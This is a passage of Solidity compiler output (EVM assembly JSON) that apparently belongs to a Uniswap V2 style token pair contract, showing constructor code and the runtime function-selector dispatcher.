									"begin": 1217,
									"end": 1527,
									"name": "PUSH",
									"value": "C0"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP2"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "ADD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP2"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MSTORE"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "DUP1"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "MLOAD"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "SWAP2"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "ADD"
								},
								{
									"begin": 1194,
									"end": 1537,
									"name": "KECCAK256"
								},
								{
									"begin": 1175,
									"end": 1191,
									"name": "PUSH",
									"value": "4"
								},
								{
									"begin": 1175,
									"end": 1537,
									"name": "SSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP"
								},
								{
									"begin": 2502,
									"end": 2522,
									"name": "DUP1"
								},
								{
									"begin": 2502,
									"end": 2522,
									"name": "SLOAD"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT"
								},
								{
									"begin": 2502,
									"end": 2522,
									"name": "AND"
								},
								{
									"begin": 2512,
									"end": 2522,
									"name": "CALLER"
								},
								{
									"begin": 2502,
									"end": 2522,
									"name": "OR"
								},
								{
									"begin": 2502,
									"end": 2522,
									"name": "SWAP1"
								},
								{
									"begin": 2502,
									"end": 2522,
									"name": "SSTORE"
								},
								{
									"begin": 318,
									"end": 18511,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 318,
									"end": 18511,
									"name": "DUP1"
								},
								{
									"begin": 318,
									"end": 18511,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 318,
									"end": 18511,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 318,
									"end": 18511,
									"name": "CODECOPY"
								},
								{
									"begin": 318,
									"end": 18511,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 318,
									"end": 18511,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820fa4b361cdd6daa0da2a7850e045553687791240905a83c39dd556167998e768b64736f6c63430005100032",
									".code": [
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "MSTORE"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "POP"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "LT"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "SHR"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "GT"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "34"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "BC25CF77"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "GT"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "35"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "DCBBB373"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "GT"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "36"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "DCBBB373"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "DD62ED3E"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "31"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "F317739C"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "FFF6CAE9"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "33"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMP"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "tag",
											"value": "36"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPDEST"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "BC25CF77"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "C45A0155"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "D21220A7"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "D505ACCF"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMP"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "tag",
											"value": "35"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPDEST"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "900820D8"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "GT"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "900820D8"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "95D89B41"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "A9059CBB"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "BA9A7A56"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMP"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "tag",
											"value": "37"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPDEST"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "7464FC3D"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "7ECEBE00"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "89AFCB44"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMP"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "tag",
											"value": "34"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPDEST"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "GT"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "38"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "47D5D856"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "GT"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "39"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "47D5D856"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "5909C0D5"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "5A3D5493"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "6A627842"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMP"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "tag",
											"value": "39"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPDEST"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "30ADF81F"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "313CE567"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "3644E515"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMP"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "tag",
											"value": "38"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPDEST"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "95EA7B3"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "GT"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "40"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "95EA7B3"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "DFE1681"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "1794BB3C"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "18160DDD"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMP"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "tag",
											"value": "40"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPDEST"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "22C0D9F"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "6FDDE03"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "902F1AC"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "EQ"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPI"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "JUMPDEST"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "DUP1"
										},
										{
											"begin": 318,
											"end": 18511,
											"name": "REVERT"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "JUMPDEST"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "DUP1"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 16,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 17,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "42"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "42"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "DUP2"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "SWAP2"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "DUP2"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "ADD"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "DUP4"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "ADD"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "AND"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "SWAP2"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "SWAP1"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "DUP2"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "ADD"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "SWAP1"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "DUP2"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "ADD"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "DUP3"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "ADD"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 21,
											"end": 32,
											"name": "PUSH",
											"value": "100000000"
										},
										{
											"begin": 5,
											"end": 33,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 33,
											"name": "GT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "43"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 46,
											"end": 47,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 43,
											"end": 44,
											"name": "DUP1"
										},
										{
											"begin": 36,
											"end": 48,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "43"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "DUP3"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "ADD"
										},
										{
											"begin": 35,
											"end": 44,
											"name": "DUP4"
										},
										{
											"begin": 28,
											"end": 32,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "DUP3"
										},
										{
											"begin": 8,
											"end": 33,
											"name": "ADD"
										},
										{
											"begin": 5,
											"end": 45,
											"name": "GT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "44"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 58,
											"end": 59,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 55,
											"end": 56,
											"name": "DUP1"
										},
										{
											"begin": 48,
											"end": 60,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "44"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "DUP1"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "SWAP1"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "ADD"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "SWAP2"
										},
										{
											"begin": 100,
											"end": 109,
											"name": "DUP5"
										},
										{
											"begin": 95,
											"end": 96,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 81,
											"end": 93,
											"name": "DUP4"
										},
										{
											"begin": 77,
											"end": 97,
											"name": "MUL"
										},
										{
											"begin": 67,
											"end": 75,
											"name": "DUP5"
										},
										{
											"begin": 63,
											"end": 98,
											"name": "ADD"
										},
										{
											"begin": 60,
											"end": 110,
											"name": "GT"
										},
										{
											"begin": 39,
											"end": 50,
											"name": "PUSH",
											"value": "100000000"
										},
										{
											"begin": 25,
											"end": 37,
											"name": "DUP4"
										},
										{
											"begin": 22,
											"end": 51,
											"name": "GT"
										},
										{
											"begin": 11,
											"end": 118,
											"name": "OR"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "PUSH [tag]",
											"value": "45"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "JUMPI"
										},
										{
											"begin": 131,
											"end": 132,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 128,
											"end": 129,
											"name": "DUP1"
										},
										{
											"begin": 121,
											"end": 133,
											"name": "REVERT"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "tag",
											"value": "45"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 11720,
